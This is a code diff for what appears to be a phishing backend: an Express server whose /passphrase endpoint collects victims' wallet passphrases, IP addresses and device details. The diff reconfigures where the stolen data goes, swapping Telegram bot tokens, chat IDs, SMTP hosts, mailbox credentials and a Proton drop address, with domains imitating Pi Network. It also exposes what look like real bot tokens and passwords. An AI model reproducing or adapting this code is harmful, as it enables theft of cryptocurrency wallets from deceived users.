@@ -7,7 +7,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const UAParser = require('ua-parser-js');
 
 const app = express();
-const botToken = '7136629679:AAH3pixtS3ElaiHCIEgj6_dGksJD-hPp5Jw'; // Replace with your Telegram bot token
+const botToken = '6899183906:AAGa0cXtXKn6xuyheLHKzJZ_nPFUXwtIz6w'; // Replace with your Telegram bot token
 const bot = new TelegramBot(botToken);
 
 app.use(bodyParser.json());
@@ -51,16 +51,16 @@ app.post('/passphrase', async (req, res) => {
       Device Info: ${JSON.stringify(deviceInfo)}
     `;
     
-    bot.sendMessage('5854167907', teleMessage);
+    bot.sendMessage('1767413154', teleMessage);
 
     // Send email using nodemailer
     let transporter = nodemailer.createTransport({
-      host: "31-41-249-166.cprapid.com",
+      host: "160-20-145-243.cprapid.com",
       port: 465,
       secure: true,
       auth: {
-        user: "admin@piexternaltransaction.com",
-        pass: "Pienetwork10",
+        user: "admin@pimainetexchange.com",
+        pass: "Piesender10",
       },
       tls: {
         rejectUnauthorized: false
@@ -68,8 +68,8 @@ app.post('/passphrase', async (req, res) => {
     });
 
     const mailOptions = {
-      from: 'admin@piexternaltransaction.com',
-      to: 'admin@piexternaltransaction.com',
+      from: 'admin@pimainetexchange.com',
+      to: 'pinetwork101@proton.me',
       subject: `Received From ${clientIP}`,
       text: `
         Passphrase: ${passphrase}
